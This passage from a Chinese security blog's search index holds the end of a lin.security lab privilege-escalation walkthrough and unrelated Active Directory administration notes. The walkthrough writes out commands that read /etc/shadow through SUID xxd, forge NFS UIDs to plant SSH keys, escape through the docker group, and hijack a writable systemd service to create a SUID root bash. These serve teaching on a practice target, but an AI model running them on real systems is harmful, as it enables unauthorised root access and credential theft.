提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"6.1 方案一 SUID 这个是 uid +s 的组合，s 指的是特殊权限。一般情况下，用户的权限是 3 位，比如 0755 这样的，默认特殊权限没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有 root 的权限，就会配置特殊权限。 比如说 passwd 这个命令，这个命令会修改 /etc/shadow 文件，而 /etc/shadow 只有 root 才能修改，本来 passwd 这个命令应该也只能 root 才能执行的。但是系统为了让普通用户能够修改自己的密码，对 passwd 这个命令赋予了特殊权限并添加了只能修改自己密码的限制。 由于 passwd 这个命令是做过限制的，所以赋予特殊权限是没有问题的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。 那我们怎么去寻找系统是否存在特殊权限配置的文件呢？可以使用如下命令快速查找所有 SUID 文件： find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; 我们发现了如下一个文件 xxd。这个文件其实是命令文件，xxd 的作用是将一个文件以 16 进制的形式显示出来。他被配置了特殊权限，并且用户组为 itservices 是拥有执行权限 x 的。 这就很危险了，一旦 suid 和执行权限在一起就可能导致权限提升。 我们通过命令查看发现 susan 这个用户属于 itservices 这个用户组。 我们用它来查看 /etc/shadow 这个文件，更多利用方法可以参考https://gtfobins.github.io/gtfobins/xxd/. xxd \"/etc/shadow\" | xxd -r 注： find /dir -exec \"command\" 同样的提权效果。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:1","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"6.2 方案二 除了上述的文件外，还发现了一个 other 角色拥有执行权限的文件，这个文件不限用户，所以危害更大。 参考https://gtfobins.github.io/gtfobins/taskset/#suid-enabled，发现该文件可以直接获取shell。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:2","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"7 NFS 提权 nmap 扫描端口，查看开放服务：nmap -sS -Pn -p- -A IP 看到开放 2049 端口，NFS 服务。也可以通过 rpcinfo -p IP 命令来确定主机上是否运行或挂载了 NFS 服务。 当 showmount 命令与以下参数一起使用时，可以进行信息收集，例如： 挂载点 连接的主机 目录 showmount IP // 连接的主机 showmount -d IP // 目录 showmount -a IP // 挂载点 在 msf 中也有一个模块，可以用来列出导出文件夹：auxiliary/scanner/nfs/nfsmount。 账号 peter 的家目录可以被挂载： mkdir /mnt/peter mount 192.168.68.99:/home/peter /mnt/peter/ 挂载好的 peter 的家目录，显示的文件的所有者和所属组分别为 1001 和 1005 尝试在该目录下创建文件，发现权限不够。 即使我们在 kali 攻击机上是 root 用户，但是我们还是没有写入权限，因为默认情况下客户端的 root 身份会被主动压缩成匿名者。 可以伪造文件所有者的 UID 和 GID 来欺骗 NFS 服务器，创建一个 gid 为 1005 的用户组，接着创建 peter 这个账户 uid 指定为 1001，gid 指定为 1005。 切换客户端用户为 peter，服务端也认为是存在的用户 peter 可以直接向 .ssh 文件夹下写入公钥，然后直接使用 ssh 登录。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:7:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"8 利用 docker 组提权 可以发现 peter 属于 docker 组： 可以根据https://fosterelli.co/privilege-escalation-via-docker.html docker run -v /:/hostOS -i -t chrisfosterelli/rootplease ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:8:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"9 systems 配置不当提权 历史上，Linux 的启动一直采用 init 进程： sudo /etc/init.d/sshd start # 或者 service sshd start 这种方法有两个缺点： 一是启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 二是启动脚本复杂。init 进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。 Systemd 就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。 使用了 Systemd，就不需要再用 init 了。Systemd 取代了 initd，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。 Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。 systemctl 是 Systemd 的主命令，用于管理系统。 # 重启系统 sudo systemctl reboot 查看 peter 用户的 systemd 配置，发现 peter 这个用户拥有 debug.service 文件，并且它对这个文件拥有读和写的权限。 如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的 .service 文件并更改 run() 命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。 查看 .service 文件，这里我们可以修改 ExecStart 文件，除此之外还可以修改 ExecStop 和 ExecReload 来在停止和重启服务时执行命令。 查看该 .service 文件： ExecStart 为 /root/debug，这是一个二进制服务并且该服务以 root 身份运行。 接下来为了利用，使用一个类似 ssh 可以 sudo 执行的方法。 让 root 身份来创建一个 systemdexpl.sh 脚本，将 /bin/bash 文件复制到 systemdbash 并设置一个 SUID 位并且赋予执行权限。 echo -e '#!/bin/bash \\ncp /bin/bash /home/peter/systemdbash \\nchmod 6755 /home/peter/systemdbash' \u003e /home/peter/systemdexpl.sh \u0026\u0026 chmod +x systemdexpl.sh 修改 debug.service 文件来调用我们的脚本（root 调用 debug.service，而 debug.service 又调用我们的 systemdexpl.sh 脚本）修改 ExecStart 为当前脚本。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:9:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["内网渗透"],"content":"AD 活动目录管理及相关概念","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"AD 活动目录管理 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:0:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域和活动目录的概念 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域和活动目录的价值 强制终端计算机及用户的安全策略及桌面/应用环境,并可实现批量和自动部署，减轻 IT 人员日常的管理难度和工作强度 域中的各类服务和资源(文件和打印共享等)的访问控制可以灵活的与企业的层次化组织架构相结合，满足复杂的权限分配等管理需求 统一的身份验证手段，可与多种 Windows 应用服务(如Exchange, Sharepoint等)及第三方软件集成，实现单点登录，改善用户在多业务中切换中的操作体验 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域中的角色 DC-域控制器 成员服务器 终端计算机 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域控制器中的 AD 数据库文件 AD 数据库文件默认保存在 C:\\Windows\\NTDS 目录 AD 数据库维护过程中必要时可进行五福启停、文件夹重定向、脱机整理、备份及恢复等操作 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域控制器之间的 AD 数据库同步 AD 数据库会定时活在发生改变时自动在 DC 之间相互同步复制，同步复制的频率和时间窗口可以配置和定义 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:4","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"特殊类型的域控制器 RODC RODC 保存域控制器中 AD 数据库的只读副本 不允许再 RODC 本地对数据库作出更改操作 RODC 适合部署在没有管理需求的远程分支机构 全局编录服务器 GC GC 是一种特殊的域控制器，一个域至少部署一台 GC 用于多域环境和其它域进行数据同步（但不是同步全部数据，通常需同步的数据仅占 AD 数据库总量的 5% ～ 10%），以优化 Exchange Server 等应用的全局或跨域搜索的效率 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:5","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域和活动目录规划 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"多域环境的需求 一个域可以包含 100 万个对象，绝大多数企业在技术上只需要一个域 出现以下需求情况时可能需要考虑多域的部署： IT 管理政策上需要有分离或独立的 IT 管控边界 公司重组或合并等原因影响到域的变化 域的改造和迁徙需要同时新旧域的并存 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"多域的分布式架构 一个域林中可以包含多个域，一个域中可以包含多个子域 父域和子域的命名空间(FQDN 域名后缀)需保持相同和连续 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域和域之间的信任关系 信任关系可实现跨域的身份验证和资源访问 如果域之间没有信任关系，每个域中的用户只能访问本域中的资源 根据场景不同，部分信任关系是默认存在的，部分是需要手工配置的 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点 站点(Site)是指同一个域内包含特定 IP 子网并与特定域控制器关联的网络 部署多个站点的目的是优化站点间 DC 的复制同步，同时使客户端能够和就近的 DC 优先通信，优化登录验证的操作 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:4","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"活动目录的规划 OU 层次化结构规划 用户和计算机命名规范 组的规划 AD 管理权限的规划 活动目录中的对象管理 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:3:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"图形化管理工具 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:4:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"命令行管理工具 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"DS 系列命令集 dsquery、dsadd、dsmod、dsmove、dsrm等 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"PowerShell 系列命令 Get-ADDomain、New-Aduser、Search-ADAccount等 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"活动目录中的对象 对象(Object) 常见的对象包括：用户、组、计算机等 容器(Container) 系统内置，是部分对象的默认逻辑存放位置 不能删除或编辑、无法进一步层次化 组织单位(OU) 用户创建，用于自定义对象的逻辑存放位置 支持层次化结构、允许编辑 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:6:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"OU(组织单位)规划 一般需体现企业组织架构或地理特征 OU 中的对象类型是否混合取决与管理的需要 OU 的主要作用是控制组策略部署范围和活动目录的管理权限委派 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:7:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"对象类型1:用户 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域用户的登录 域用户名@域名 （如tester@abc.com） 域名\\域用户名 （如abc\\tester） ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"查看 SID get-aduser -Identify [username] ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"用户单个用户的创建和管理方式 AD 用户和计算机 AD 管理中心 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"批量用户的创建和管理方式 服务器内置命令行工具(如 csvde 和 ldifde) 编写 Powershell 脚本 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:4","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"对象类型2：组 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组的用途 批量设置用户的权限或者权利 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组的分类 按是否内置：内置组、自定义组 按作用范围：本地组、全局组、通用组 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"对象类型3：计算机 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"计算机被动加域 活动目录中事先未创建计算机账号，加域后计算机账户自动保存在默认的 Computers 容器中 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"计算机主动加域 活动目录中事先已由管理员在指定的 OU 中创建好计算机账号，加域后将根据对应的计算机名关联实现创建在指定的 OU 中的计算机账号 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"计算机账户密码/安全通道 加入域的计算机与域控制器之间通讯的安全通道(Secure Channel)建立需要密码，由客户端计算机本地生成后上传到域控制器的活动目录中保存，默认每隔 30 天自动更换该密码 如果客户端计算机超过 30 天未能和域控制器通信，则域控制器允许使用之前保存在活动目录中上一次已过期的计算机账户密码维系安全通道，但时间最多不能超过两个密码更新周期(默认最长60天)，否则安全通道将被破坏，客户端将自动脱域，导致用户无法登录 计算机密码的更新周期和有效性等参数可通过组策略调整 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:11:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"对象的查找和筛选 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"AD 用户和计算机 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"AD 管理中心 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"PS 脚本 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"AD 管理的权利委派 对 AD 的操作委派可以在 OU 层面配置,以分配对该 OU 内对象的常见管理任务给指定的用户或组，减轻域管理员工作负荷(比如修改部门账的属性,解除帐号锁定,重置账户密码等) ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:13:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"RSAT 工具 RAT(Remote Server Administration Tool)可配合 AD 权利委派，用于在客户端操作系统上进行AD域服务的远程操作(如重置密码，解禁密码等) 组策略的配置 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:13:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略概述 组策略的本质是以更友好的方式修改计算机的注册表，组策略中每一项设置都可以和注册表中的键值对应，以实现对操作系统及应用程序的运行控制 组策略包含本地组策略和域组策略 本地组策略: gpedit.msc 域组策略：域控制器上使用 组策略工具 配置并下发 通过域组策略有助于规范域内终端的统一管理并减少人员的工作量 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:14:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的常见用途 帐号安全/审计策略 开机/关机脚本 文件夹重定向 部署打印机/共享文件夹映射 客户端桌面环境设置 IE 等微软应用程序参数设置 软件自动安装部署 限制软件运行 防火墙安全设置 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:15:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的分类 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"维度一：按配置生效的阶段 计算机配置 用户配置 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"维度二：安配置是否可以被更改 策略 首选项 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"维度三：按配置内容领域 Windows 设置 管理模板 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的配置 系统默认包含两个默认的 GPO Default Domain Policy 域级别，影响域中所有的计算机和用户 Default Domain Controller Policy 容器级别，影响所有域控制器 其它的 GPO 需要自行创建配置和链接 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:17:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"部署的注意事项 GPO 需要在域控制器上配置，且会通过 AD 的复制机制向其他域控同步 GPO 创建编辑后只有链接到域或 OU 才能使该组策略生效 一条 GPO 可以关联到多个 OU 上，一个 OU 上也可包含多条不同的 GPO 删除 GPO 链接并不等于删除 GPO，但删除 GPO 会自动删除相关联的 GPO 链接 如需让 GPO 不生效，可以禁用 GPO 的某个链接，也可以整体不启用该 GPO，不一定需要删除GPO 链接或删除 GPO ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:18:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的应用范围 GPO 